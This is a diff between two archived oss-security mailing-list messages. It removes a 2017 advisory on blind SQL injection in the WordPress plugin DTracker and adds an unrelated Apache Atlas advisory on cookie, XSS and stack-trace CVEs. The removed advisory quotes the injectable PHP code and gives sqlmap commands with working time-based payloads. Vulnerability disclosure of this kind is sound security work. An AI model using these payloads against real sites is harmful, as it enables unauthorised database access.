@@ -1,73 +1,144 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/09/3
-Message-id: <C3D0A2F5-941D-4030-9910-57C3E46053E1@me.com>
-Date: Thu, 09 Mar 2017 07:57:13 -0500
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/08/3
+Message-ID: <A71CF38B-7971-45B5-8450-43AFC566D717@apache.org>
+Date: Sun, 07 May 2017 19:45:57 -0700
+From: Madhan Neethiraj <madhan@...che.org>
+To: <dev@...as.incubator.apache.org>, <private@...as.incubator.apache.org>, <user@...as.incubator.apache.org>, <security@...che.org>, <oss-security@...ts.openwall.com>, <bugtraq@...urityfocus.com>
+Subject: CVE updates: fixes in Apache Atlas 0.7.1-incubating
 Content-Type: text/plain; charset=utf-8
 
-Title: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-03-08
-CVE-IDs: CVE-2017-1002004 CVE-2017-1002005
-Download Site: https://wordpress.org/plugins/dtracker/
-Vendor: https://profiles.wordpress.org/dijo/
-Vendor Notified: 2017-03-08
-Vendor Contact: plugins@...dpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=183
-Description: Track the details of the users downloading the pdf files from wordpress site.
-Vulnerability:
-CVE-2017-1002004:
-In file ./dtracker/download.php user input isn't sanitized via the id variable before adding it to the end of an SQL query.
+All,
 
-$doc_id         = $_GET['id'];
-$file = $wpdb->get_results( "SELECT * FROM wp_posts WHERE ID = $doc_id " );
+ 
 
-The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.
+Please see below the details of CVE updates for Apache Atlas 0.7.1-incubating release. My apologies
 
-CVE-2017-1002005:
-In file ./dtracker/delete.php user input isn't sanitized via the contact_id variable before adding it to the end of an SQL query.
+for the delay in sending this update.
 
-$contact_id     = $_POST['contact_id']; //Contact ID to be deleted
+ 
 
-$query  = "DELETE FROM wp_contacts WHERE id = $contact_id";
-$wpdb->query($query); // Delete the contact
+Thanks,
 
-The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.
+Madhan
 
-Exploit Code:
-	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/download.php?id=*'  --dbms mysql  --level 3 --risk 3
-	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
-	• sqlmap identified the following injection point(s) with a total of 1410 HTTP(s) requests:
-	• ---
-	• Parameter: #1* (URI)
-	•     Type: AND/OR time-based blind
-	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
-	•     Payload: http://192.168.0.169:80/wordpress/wp-content/plugins/dtracker/download.php?id=(CASE WHEN (7148=7148) THEN SLEEP(5) ELSE 7148 END)
-	• ---
-	• [10:14:09] [INFO] the back-end DBMS is MySQL
-	• web server operating system: Linux Ubuntu 16.04 (xenial)
-	• web application technology: Apache 2.4.18
-	• back-end DBMS: MySQL >= 5.0.12
-	• [10:14:09] [WARNING] HTTP error codes detected during run:
-	• 404 (Not Found) - 14 times
-	• [10:14:09] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
-	
+ 
+
+-------------------------------------------------------------------------------------------------------
+
+CVE-2017-3150: Use of insecure cookies
+
+Severity: Normal
+
+Vendor: The Apache Software Foundation
+
+Versions Affected: 0.6.0 or 0.7.0 versions of Apache Atlas
+
+Users affected: All users of Apache Atlas server
+
+Description: Atlas uses cookies that could be accessible to client-side script
+
+Fix detail: Atlas was updated to make the cookies unavailable to client-side scripts
+
+Mitigation: Users should upgrade to Apache Atlas 0.7.1-incubating or later version
+
+-------------------------------------------------------------------------------------------------------
+
+CVE-2017-3151: Persistent XSS vulnerability
+
+Severity: Normal
+
+Vendor: The Apache Software Foundation
+
+Versions Affected: 0.6.0 or 0.7.0 versions of Apache Atlas
+
+Users affected: All users of Apache Atlas server
+
+Description: Atlas was found vulnerable to a Stored Cross-Site Scripting in the edit-tag functionality
+
+Fix detail: Atlas was updated to sanitize the user input
+
+Mitigation: Users should upgrade to Apache Atlas 0.7.1-incubating or later version
+
+-------------------------------------------------------------------------------------------------------
+
+CVE-2017-3152: DOM XSS threat
+
+Severity: Normal
+
+Vendor: The Apache Software Foundation
+
+Versions Affected: 0.6.0 or 0.7.0 versions of Apache Atlas
+
+Users affected: All users of Apache Atlas server
+
+Description: Atlas was found vulnerable to a DOM XSS in the edit-tag functionality
+
+Fix detail: Atlas was updated to sanitize the query parameters
+
+Mitigation: Users should upgrade to Apache Atlas 0.7.1-incubating or later version
+
+-------------------------------------------------------------------------------------------------------
+
+CVE-2017-3153: Reflected XSS vulnerability
+
+Severity: Normal
+
+Vendor: The Apache Software Foundation
+
+Versions Affected: 0.6.0 or 0.7.0 versions of Apache Atlas
+
+Users affected: All users of Apache Atlas server
+
+Description: Atlas was found vulnerable to a Reflected XSS in the search functionality
+
+Fix detail: Atlas was updated to sanitize the query parameters
+
+Mitigation: Users should upgrade to Apache Atlas 0.7.1-incubating or later version
+
+-------------------------------------------------------------------------------------------------------
+
+CVE-2017-3154: Stack trace in error response
+
+Severity: Normal
+
+Vendor: The Apache Software Foundation
+
+Versions Affected: 0.6.0 or 0.7.0 versions of Apache Atlas
+
+Users affected: All users of Apache Atlas server
+
+Description: Error response from Atlas server included stack trace, exposing excessive information
+
+Fix detail: Atlas was updated to not include stack trace in error responses
+
+Mitigation: Users should upgrade to Apache Atlas 0.7.1-incubating or later version
+
+-------------------------------------------------------------------------------------------------------
+
+CVE-2017-3155: XFS - cross frame scripting vulnerability
+
+Severity: Normal
+
+Vendor: The Apache Software Foundation
+
+Versions Affected: 0.6.0 or 0.7.0 versions of Apache Atlas
+
+Users affected: All users of Apache Atlas server
+
+Description: Atlas was found vulnerable to a cross frame scripting
+
+Fix detail: Atlas was updated to use appropriate headers to prevent this vulnerability
+
+Mitigation: Users should upgrade to Apache Atlas 0.7.1-incubating or later version
+
+-------------------------------------------------------------------------------------------------------
+
+ 
+
+ 
+
+ 
+
+ 
 
 
-	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/delete.php' --data 'contact_id=*'  --dbms mysql --risk 1 --level 3
-	•  
-	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
-	• sqlmap identified the following injection point(s) with a total of 831 HTTP(s) requests:
-	• ---
-	• Parameter: #1* ((custom) POST)
-	•     Type: AND/OR time-based blind
-	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
-	•     Payload: contact_id=(SELECT * FROM (SELECT(SLEEP(5)))Vtrh)
-	• ---
-	• [11:53:27] [INFO] the back-end DBMS is MySQL
-	• web server operating system: Linux Ubuntu 16.04 (xenial)
-	• web application technology: Apache 2.4.18
-	• back-end DBMS: MySQL >= 5.0.12
-	• [11:53:27] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
